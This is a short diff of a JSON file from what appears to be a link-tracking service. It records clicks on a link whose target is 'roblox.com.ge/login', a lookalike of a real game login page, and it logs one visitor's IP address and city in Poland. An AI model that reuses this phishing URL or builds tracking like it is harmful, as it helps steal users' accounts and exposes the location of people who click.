@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1018,
+    "useCount": 1019,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8259,6 +8259,14 @@
       },
       {
         "timestamp": 1777225744865,
+        "ip": "91.214.52.92",
+        "country": "Poland",
+        "city": "Radlin",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777225758771,
         "ip": "91.214.52.92",
         "country": "Poland",
         "city": "Radlin",
